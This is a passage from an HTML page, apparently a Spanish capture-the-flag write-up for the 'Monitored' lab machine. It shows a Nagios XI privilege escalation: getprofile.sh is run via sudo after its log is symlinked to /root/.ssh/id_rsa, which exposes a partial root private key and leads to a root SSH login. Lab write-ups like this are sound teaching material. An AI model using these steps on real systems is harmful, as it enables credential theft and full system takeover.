+                <p>El script <code>/usr/local/nagiosxi/scripts/components/getprofile.sh</code> está diseñado para recopilar información del sistema con fines de resolución de problemas. Lee varios archivos de logs usando <code>tail</code> y crea un archivo ZIP conteniendo sus contenidos en <code>/usr/local/nagiosxi/var/components/profile.zip</code>.</p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>Uno de los archivos que el script lee es <code>/usr/local/nagiosxi/tmp/phpmailer.log</code>. La clave es que tengo permisos de escritura en el directorio <code>/usr/local/nagiosxi/tmp/</code> debido a la propiedad de grupo asignada al usuario nagios.</p>
+
+                <p>Esto significa que puedo eliminar el archivo <code>phpmailer.log</code> existente y crear un enlace simbólico apuntando a cualquier archivo del sistema. Cuando el script se ejecute con privilegios de root, leerá el archivo objetivo e incluirá sus contenidos en el archivo ZIP.</p>
+
+                <h3>Extrayendo la Clave SSH de Root</h3>
+                <p>Creo un enlace simbólico desde <code>phpmailer.log</code> a la clave SSH privada de root:</p>
+                <pre><code class="language-bash">cd /usr/local/nagiosxi/tmp
+ln -s /root/.ssh/id_rsa phpmailer.log</code></pre>
+
+                <p>Ahora ejecuto el script <code>getprofile.sh</code> con sudo (el script requiere un parámetro de ID de perfil, que puede ser cualquier valor):</p>
+                <pre><code class="language-bash">sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1</code></pre>
+
+                <p>El script se ejecuta exitosamente y crea un archivo ZIP. Lo extraigo para acceder a sus contenidos:</p>
+                <pre><code class="language-bash">unzip ../var/components/profile.zip</code></pre>
+
+                <p>Dentro del archivo extraído, el archivo <code>phpmailer.log</code> ahora contiene la clave SSH privada de root:</p>
+                <pre><code class="language-bash">cat profile-1765984977/phpmailer.log</code></pre>
+                <pre><code class="language-plaintext">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAnZYnlG22OdnxaaK98DJMc9isuSgg9wtjC0r1iTzlSRVhNALtSd2C
+[...]</code></pre>
+
+                <p>Copio esta clave privada a mi máquina local y la guardo como <code>root_id_rsa</code>. Establezco los permisos correctos en el archivo de la clave:</p>
+                <pre><code class="language-bash">chmod 600 root_id_rsa</code></pre>
+
+                <h2>Acceso Root vía SSH</h2>
+                <p>Con la clave SSH privada de root en mi poder, ahora puedo conectarme directamente al sistema como root:</p>
+                <pre><code class="language-bash">ssh -i root_id_rsa root@monitored.htb</code></pre>
+
+                <p>La conexión es exitosa, otorgándome acceso root:</p>
+                <pre><code class="language-plaintext">Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+root@monitored:~# whoami
+root</code></pre>
+
+                <p>Ahora puedo recuperar la flag de root y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
